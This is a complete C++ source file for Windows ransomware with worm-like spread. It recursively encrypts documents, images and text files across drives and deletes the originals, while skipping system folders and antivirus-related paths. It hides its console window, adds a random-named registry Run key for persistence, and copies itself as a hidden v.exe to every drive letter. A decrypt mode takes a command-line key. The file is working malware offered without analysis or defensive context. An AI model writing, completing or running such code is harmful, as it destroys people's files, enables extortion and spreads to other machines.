#include <iostream>
#include <string>
#include <cstring>
#include <cstdio>
#include <io.h>
#include <vector>
#include "wcode.h"
#include <cctype>
#include <algorithm>
#include <windows.h>
#include <cstdlib>
#include <time.h>

#define debug 1

extern "C" WINBASEAPI HWND WINAPI GetConsoleWindow ();

using namespace std;

bool check(string p) //1 for skip
{
    transform(p.begin(),p.end(),p.begin(),::tolower);
    if(p.find("windows")!=-1 || p.find("wiku")!=-1)
        return 1;
    if(p.find("sand")!=-1 || p.find("boot")!=-1 || p.find("360")!=-1)
        return 1;
    if(p.find(".doc")!=-1 || p.find(".xls")!=-1 || p.find(".jp")!=-1 || p.find(".gif")!=-1 ||
       p.find(".png")!=-1 || p.find(".ppt")!=-1 || p.find(".pdf")!=-1 || p.find(".txt")!=-1)
        return 0;
    if(p.find(".rm")!=-1 || p.find(".exe")!=-1 || p.find("programdata")!=-1 || p.find("program files")!=-1 ||
       p.find(".dll")!=-1)
        return 1;
    return 0;
}

void process(string path,string pass,int type) //1: encrypt 2:decrypt
{
    if(type==1 && pass=="")
        pass="stupid";
    string tmp=path;

    if(type==1 && check(path))
        return;
    //system(("attrib -s -h "+path).c_str());

    crypt c(pass);
    c.load(path);
    c.code(1,type);
    if(type==1)
        remove(path.c_str());

    if (debug || type==2)
        cout<<path<<endl;


}

void getFiles(string path /*, vector<string>& files*/,string pass, int type )
{
    //文件句柄
    long   hFile   =   0;
    //文件信息
    struct _finddata_t fileinfo;
    string p;
    if((hFile = _findfirst(p.assign(path).append("\\*").c_str(),&fileinfo)) !=  -1)
    {
        do
        {
            if((fileinfo.attrib &  _A_SUBDIR))
            {
                if(strcmp(fileinfo.name,".") != 0  &&  strcmp(fileinfo.name,"..") != 0)
                    getFiles( p.assign(path).append("\\").append(fileinfo.name)/*, files*/ ,pass, type);
            }
            else
            {
                //files.push_back(p.assign(path).append("\\").append(fileinfo.name) );
                process( p.assign(path).append("\\").append(fileinfo.name),pass, type);
            }
        }while(_findnext(hFile, &fileinfo)  == 0);
        _findclose(hFile);
    }
}


LONG addreg(char *p){
    HKEY hkey;LONG ReturnNum;
    DWORD dwType = REG_SZ;
    DWORD dwSize;
    dwSize=strlen(p);
    char name[12];//存放路径。
    int i;
    //srand(time(0));//随机种子数
    for(i=0;i<9;i++)
        name[i]=(rand()%26+'a');
    name[i]=0;
    //添加开机启动项到注册表。
    ReturnNum=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&hkey);
    if(ReturnNum!=0)
        return -1;
    return RegSetValueEx(hkey,(LPCSTR)name,(DWORD)0,dwType,p,dwSize);
}

int main(int argc, char** argv)
{
    int type=1;
    string key;
    string path;
    string self = argv[0];

#if debug
#else
    if(argc==1)
    {
        HWND hwnd;

        hwnd=FindWindow("ConsoleWindowClass",NULL); //处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。
        if(hwnd)
        {
            ShowWindow(hwnd,SW_HIDE);               //设置指定窗口的显示状态
        }
    }

#endif

    if(argc>=2)
    {
        type=2;
        key=argv[1];
    }
#if debug
    cout<<"######"<<argv[0]<<endl;
#endif // debug

    addreg(self.c_str());

    char a[3]="a:";
    do
    {
        system("attrib +s +h v.exe");
        for(a[0]='a';a[0]<='u';a[0]++)
        {
            getFiles(a, key, type);
            path = a;
            path += "\\v.exe";
            CopyFile(argv[0],path.c_str(),0);

            system(("attrib +s +h "+path).c_str());
        }



        Sleep(3000);
    }
    while(argc==1);
    return 0;
}
